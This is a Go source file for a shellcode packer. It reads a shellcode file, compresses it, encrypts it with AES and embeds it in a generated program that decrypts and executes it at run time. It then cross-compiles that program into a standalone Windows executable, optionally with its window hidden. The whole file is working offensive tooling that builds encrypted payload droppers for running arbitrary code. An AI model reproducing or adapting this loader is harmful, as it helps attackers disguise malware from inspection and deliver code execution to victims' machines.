package main

import (
	"bytes"
	"compress/flate"
	"encoding/hex"
	"flag"
	"fmt"
	"html/template"
	"io/ioutil"
	"os"
	"os/exec"

	"project/internal/convert"
	"project/internal/crypto/aes"
	"project/internal/module/shellcode"
	"project/internal/random"
	"project/internal/system"
)

func main() {
	var (
		format string
		input  string
		sys    string
		arch   string
		output string
		method string
		noGUI  bool
	)
	usage := "input shellcode format, support hex and raw"
	flag.StringVar(&format, "f", "raw", usage)
	usage = "input shellcode file path"
	flag.StringVar(&input, "i", "", usage)
	usage = "output executable about operation system"
	flag.StringVar(&sys, "os", "windows", usage)
	usage = "output executable about architecture"
	flag.StringVar(&arch, "arch", "386", usage)
	usage = "output executable file path"
	flag.StringVar(&output, "o", "output.exe", usage)
	usage = "hide Windows GUI"
	flag.BoolVar(&noGUI, "no-gui", false, usage)
	usage = "shellcode execute method"
	flag.StringVar(&method, "m", shellcode.MethodVirtualProtect, usage)
	flag.Parse()

	// load executable file
	if input == "" {
		system.PrintError("no input shellcode file path")
	}
	scData, err := ioutil.ReadFile(input) // #nosec
	system.CheckError(err)
	if format == "hex" {
		scData, err = hex.DecodeString(string(scData))
		system.CheckError(err)
	}

	// compress shellcode
	fmt.Println("compress generated shellcode")
	flateBuf := bytes.NewBuffer(make([]byte, 0, len(scData)))
	writer, err := flate.NewWriter(flateBuf, flate.BestCompression)
	system.CheckError(err)
	_, err = writer.Write(scData)
	system.CheckError(err)
	err = writer.Close()
	system.CheckError(err)

	// encrypt shellcode
	fmt.Println("encrypt compressed shellcode")
	aesKey := random.Bytes(aes.Key256Bit)
	aesIV := random.Bytes(aes.IVSize)
	encShellcode, err := aes.CBCEncrypt(flateBuf.Bytes(), aesKey, aesIV)
	system.CheckError(err)

	// generate source code
	fmt.Println("generate source code")
	tpl := template.New("execute")
	_, err = tpl.Parse(srcTemplate)
	system.CheckError(err)
	const tempSrc = "temp.go"
	srcFile, err := os.Create(tempSrc)
	system.CheckError(err)
	defer func() {
		_ = srcFile.Close()
		_ = os.Remove(tempSrc)
	}()
	cfg := config{
		Shellcode: convert.OutputBytes(encShellcode),
		AESKey:    convert.OutputBytes(aesKey),
		AESIV:     convert.OutputBytes(aesIV),
		Method:    method,
	}
	err = tpl.Execute(srcFile, cfg)
	system.CheckError(err)

	// build source code
	fmt.Println("build source code to final executable file")
	ldFlags := "-s -w"
	if noGUI {
		ldFlags += " -H windowsgui"
	}
	args := []string{"build", "-v", "-trimpath", "-ldflags", ldFlags, "-o", output, tempSrc}
	cmd := exec.Command("go", args...) // #nosec
	cmd.Env = append(os.Environ(), "GOOS="+sys)
	cmd.Env = append(cmd.Env, "GOARCH="+arch)
	cmdOutput, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Println(string(cmdOutput))
		fmt.Println(err)
		return
	}
	fmt.Println("build final executable file finish")
}

type config struct {
	Shellcode string
	AESKey    string
	AESIV     string
	Method    string
}

const srcTemplate = `
package main

import (
	"bytes"
	"compress/flate"
	"fmt"

	"project/internal/crypto/aes"
	"project/internal/module/shellcode"
)

func main() {
	encShellcode := {{.Shellcode}}

	// decrypt shellcode
	aesKey := {{.AESKey}}
	aesIV := {{.AESIV}}
	decShellcode, err := aes.CBCDecrypt(encShellcode, aesKey, aesIV)
	if err != nil {
		fmt.Println("failed to decrypt shellcode:", err)
		return
	}

	// decompress shellcode
	rc := flate.NewReader(bytes.NewReader(decShellcode))
	sc := bytes.NewBuffer(make([]byte, 0, len(decShellcode)*2))
	_, err = sc.ReadFrom(rc)
	if err != nil {
		fmt.Println("failed to decompress shellcode:", err)
		return
	}

	// execute shellcode
	method := "{{.Method}}"
	err = shellcode.Execute(method, sc.Bytes())
	if err != nil {
		fmt.Println("failed to execute shellcode:", err)
	}
}
`
